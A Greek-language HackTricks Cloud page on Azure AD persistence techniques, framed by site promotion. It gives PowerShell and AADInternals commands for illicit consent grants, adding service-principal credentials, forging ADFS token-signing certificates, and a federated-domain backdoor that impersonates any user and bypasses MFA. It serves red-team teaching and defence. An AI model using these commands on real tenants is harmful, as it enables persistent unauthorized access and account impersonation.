# Az - Μόνιμη παραμονή

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

### Παράνομη Χορήγηση Συναίνεσης

Από προεπιλογή, οποιοσδήποτε χρήστης μπορεί να καταχωρίσει μια εφαρμογή στο Azure AD. Έτσι, μπορείτε να καταχωρίσετε μια εφαρμογή (μόνο για τον στόχο του tenant) που χρειάζεται δικαιώματα υψηλής επίδρασης με τη συναίνεση του διαχειριστή (και να την εγκρίνετε εάν είστε ο διαχειριστής) - όπως η αποστολή email εκ μέρους ενός χρήστη, διαχείριση ρόλων κ.λπ. Αυτό θα μας επιτρέψει να **εκτελέσουμε επιθέσεις phishing** που θα ήταν πολύ **επιτυχημένες** σε περίπτωση επιτυχίας.

Επιπλέον, μπορείτε επίσης να αποδεχτείτε αυτήν την εφαρμογή με τον χρήστη σας ως έναν τρόπο να διατηρήσετε πρόσβαση πάνω της.

### Εφαρμογές και Υπηρεσιακοί Υποκείμενοι

Με τα προνόμια του Διαχειριστή Εφαρμογών, GA ή ενός προσαρμοσμένου ρόλου με δικαιώματα ενημέρωσης διαπιστευτηρίων microsoft.directory/applications/credentials, μπορούμε να προσθέσουμε διαπιστευτήρια (κρυφό ή πιστοποιητικό) σε μια υπάρχουσα εφαρμογή.

Είναι δυνατόν να **επιτεθείτε σε μια εφαρμογή με υψηλά δικαιώματα** ή να **προσθέσετε μια νέα εφαρμογή** με υψηλά δικαιώματα.

Ένας ενδιαφέρων ρόλος που μπορεί να προστεθεί στην εφαρμογή είναι ο **Ρόλος Διαχειριστή Προνομιούχου Ταυτοποίησης**, καθώς επιτρέπει την **επαναφορά κωδικού πρόσβασης** των Γενικών Διαχειριστών.

Αυτή η τεχνική επίσης επιτρέπει την **παράκαμψη του MFA**.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Για πιστοποίηση βάσει πιστοποιητικού

{% code overflow="wrap" %}
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Ομοσπονδία - Πιστοποιητικό Υπογραφής Διακριτικού

Με **προνόμια DA** στον τοπικό AD, είναι δυνατόν να δημιουργήσουμε και να εισαγάγουμε **νέα πιστοποιητικά υπογραφής διακριτικού** και **πιστοποιητικά αποκρυπτογράφησης διακριτικού** με πολύ μεγάλη ισχύ. Αυτό θα μας επιτρέψει να **συνδεθούμε ως οποιονδήποτε χρήστη** του οποίου γνωρίζουμε το ImuutableID.

**Εκτελέστε** την παρακάτω εντολή ως **DA στους διακομιστές ADFS** για να δημιουργήσετε νέα πιστοποιητικά (προκαθορισμένος κωδικός πρόσβασης 'AADInternals'), προσθέστε τα στο ADFS, απενεργοποιήστε την αυτόματη ανανέωση και επανεκκινήστε την υπηρεσία:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Στη συνέχεια, ενημερώστε τις πληροφορίες του πιστοποιητικού με το Azure AD:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Ένωση - Έμπιστος τομέας

Με τα προνόμια GA σε έναν ενοικιαστή, είναι δυνατόν να **προστεθεί ένας νέος τομέας** (πρέπει να επαληθευτεί), να διαμορφωθεί ο τύπος πιστοποίησης του σε Ένωση και να διαμορφωθεί ο τομέας για να **εμπιστευτεί ένα συγκεκριμένο πιστοποιητικό** (any.sts στην παρακάτω εντολή) και έκδοση:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Αναφορές

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΛΑΝΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
